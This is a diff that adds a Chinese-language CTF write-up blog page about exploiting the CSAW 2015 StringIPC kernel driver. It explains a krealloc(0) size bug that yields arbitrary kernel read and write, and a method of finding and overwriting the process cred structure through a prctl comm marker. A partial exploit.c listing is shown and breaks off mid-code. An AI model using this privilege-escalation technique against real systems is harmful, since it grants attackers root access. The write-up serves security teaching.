@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，查看一下启动脚本，发现没有开smap、smep、kaslr 12345678qemu-system-x86_64 \      -m 512 \      -kernel .&#x2F;bzImage \      -initrd .&#x2F;rootfs.cpio \      -append &quot;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram rdinit&#x3D;&#x2F;sbin&#x2F;init&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAW-2015-StringIPC解法一搜索修改cred结构">
+<meta property="og:url" content="https://github.com/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，查看一下启动脚本，发现没有开smap、smep、kaslr 12345678qemu-system-x86_64 \      -m 512 \      -kernel .&#x2F;bzImage \      -initrd .&#x2F;rootfs.cpio \      -append &quot;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram rdinit&#x3D;&#x2F;sbin&#x2F;init&quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/image3.png">
+<meta property="article:published_time" content="2020-03-06T03:30:11.000Z">
+<meta property="article:modified_time" content="2025-06-26T03:50:57.687Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="Linux Kernel">
+<meta property="article:tag" content="Linux内核堆">
+<meta property="article:tag" content="task_struct">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CSAW-2015-StringIPC解法一搜索修改cred结构 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSAW-2015-StringIPC解法一搜索修改cred结构
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-06 11:30:11" itemprop="dateCreated datePublished" datetime="2020-03-06T11:30:11+08:00">2020-03-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 11:50:57" itemprop="dateModified" datetime="2025-06-26T11:50:57+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，查看一下启动脚本，发现没有开smap、smep、kaslr</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \  </span><br><span class="line">    -m 512 \  </span><br><span class="line">    -kernel ./bzImage \  </span><br><span class="line">    -initrd ./rootfs.cpio \  </span><br><span class="line">    -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; \  </span><br><span class="line">    -nographic \  </span><br><span class="line">    -s \  </span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \ </span><br></pre></td></tr></table></figure>
+
+<p>查看一下内核版本，为4.4.x</p>
+<img src="/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/image1.JPG" class="">
+
+<p>然后，我们分析一下StringIPC.ko驱动文件，题目有提供给我们源代码，那么我们直接分析源代码</p>
+<p>realloc_ipc_channel函数里，没有对new_size进行检查**，如果new_size为-1的话，程序将krealloc(0)，与glibc的堆不同的是,如果kmalloc(0)&#x2F;kerallloc(0)，返回的地址就是0x10**</p>
+<img src="/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/image2.JPG" class="">
+
+<p>而后面又将buf_size设置为new_size，<strong>如果new_size是-1，由于是无符号数，并且堆地址为0x10，那么我们就能实现任意地址读写</strong></p>
+<p>写数据的时候，需要注意的是使用了strncpy_from_user函数，因此数据中如果遇到0，就截断了，因此，<strong>在写的时候，我们应该逐字节写入</strong></p>
+<img src="/ha1vk/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/image3.png" class="">
+
+<p>能实现任意地址读写，那么最简单的方法就是在内存里搜索cred结构，然后篡改，从而提权。那么，如何可靠的在内存中查找cred结构能？</p>
+<p>Linux的进程有一个这样的结构体(太长部分省略)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span>  </span><br><span class="line">   ...  </span><br><span class="line">   <span class="comment">/* Objective and real subjective task credentials (COW): */</span>  </span><br><span class="line">   <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>      *<span class="title">real_cred</span>;</span>  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span>  </span><br><span class="line">   <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>      *<span class="title">cred</span>;</span>  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">    * executable name, excluding path. </span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * - normally initialized setup_new_exec() </span></span><br><span class="line"><span class="comment">    * - access it with [gs]et_task_comm() </span></span><br><span class="line"><span class="comment">    * - lock it with task_lock() </span></span><br><span class="line"><span class="comment">    */</span>  </span><br><span class="line">   <span class="type">char</span>             comm[TASK_COMM_LEN];  </span><br><span class="line">   ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>我们看到了，在task_struct结构体里有cred的指针，我们只要得到了cred的指针的值，那么我们就能利用任意地址读写来找到cred，进而修改。那么如何找到cred的指针呢？我们注意到，<strong>在cred指针下方，有一个comm字符数组</strong>，这个字符串表示线程的名字，<strong>其内容可以通过linux的prctl(PR_SET_NAME,target);来设置指定的值</strong>那么，我们设置一个复杂的长度不超过16字节的字符串作为标记，然后，<strong>在内存里搜索这个标记</strong>，如果搜索到了，就可以确定这个位置前面就是cred指针。</p>
+<p>为了提高搜索的效率，我们还要确定一下搜索的范围，linux kernel的内存映射图如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffffffffff</span>  ---+-----------+-----------------------------------------------+-------------+  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">    <span class="number">8</span>M                 |           | unused hole                                   |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line"><span class="number">0xffffffffff7ff000</span>  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|  </span><br><span class="line">    <span class="number">1</span>M                 |           |                                               |+++++++++++++|  </span><br><span class="line"><span class="number">0xffffffffff600000</span>  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|  </span><br><span class="line">    <span class="number">548</span>K               |           | vsyscalls                                     |+++++++++++++|  </span><br><span class="line"><span class="number">0xffffffffff577000</span>  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|  </span><br><span class="line">    <span class="number">5</span>M                 |           | hole                                          |+++++++++++++|  </span><br><span class="line"><span class="number">0xffffffffff000000</span>  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">    <span class="number">1520</span>M              |           | module mapping <span class="title function_">space</span> <span class="params">(MODULES_LEN)</span>            |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|  </span><br><span class="line">    2G                 |           | hole                                          |+++++++++++++|  </span><br><span class="line">0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|  </span><br><span class="line">    64G                |           | EFI region mapping space                      |+++++++++++++|  </span><br><span class="line">0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|  </span><br><span class="line">    444G               |           | hole                                          |+++++++++++++|  </span><br><span class="line">0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|  </span><br><span class="line">    16T                |           | %esp fixup stacks                             |+++++++++++++|  </span><br><span class="line">0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|  </span><br><span class="line">    3T                 |           | hole                                          |+++++++++++++|  </span><br><span class="line">0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|  </span><br><span class="line">    16T                |           | kasan shadow <span class="title function_">memory</span> <span class="params">(<span class="number">16</span>TB)</span>                    |+++++++++++++|  </span><br><span class="line">0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|  </span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|  </span><br><span class="line">0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|  </span><br><span class="line">    1T                 |           | virtual memory <span class="built_in">map</span> <span class="keyword">for</span> all of <span class="keyword">struct</span> pages    |+++++++++++++|  </span><br><span class="line">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|  </span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|  </span><br><span class="line">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|  </span><br><span class="line">    32T                |           | vmalloc/<span class="title function_">ioremap</span> <span class="params">(<span class="number">1</span> &lt;&lt; VMALLOC_SIZE_TB)</span>        |+++++++++++++|  </span><br><span class="line">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|  </span><br><span class="line">    1T                 |           | hole                                          |+++++++++++++|  </span><br><span class="line">0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">    64T                |           | direct mapping of all phys. memory            |+++++++++++++|  </span><br><span class="line">                       |           | <span class="params">(<span class="number">1</span> &lt;&lt; MAX_PHYSMEM_BITS)</span>                       |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">    8T                 |           | guard hole, reserved <span class="keyword">for</span> hypervisor           |+++++++++++++|  </span><br><span class="line">                       |           |                                               |+++++++++++++|  </span><br><span class="line">0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+  </span><br><span class="line">                       |-----------|                                               |-------------|  </span><br><span class="line">                       |-----------| hole caused by [48:63] sign extension         |-------------|  </span><br><span class="line">                       |-----------|                                               |-------------|  </span><br><span class="line">0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+  </span><br><span class="line">    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|  </span><br><span class="line">0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|  </span><br><span class="line">                       |           |                                               |  user space |  </span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|  </span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|  </span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|  </span><br><span class="line">    128T               |           | different per mm                              |xxxxxxxxxxxxx|  </span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|  </span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|  </span><br><span class="line">                       |           |                                               |xxxxxxxxxxxxx|  </span><br><span class="line">0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+  </span><br></pre></td></tr></table></figure>
+
+<p>我们注意到，在**0xffff880000000000——0xffffc80000000000区域，**是堆的分配区域，因此，我们只需要搜索这段内存，即可找到task_struct结构，进而找到cred结构。</p>
+<p>我们的exploit.c程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_IOCTL_BASE     0x77617363  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8  </span></span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">size_t</span> buf_size;  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">size_t</span> size;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">    <span class="type">size_t</span> count;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span 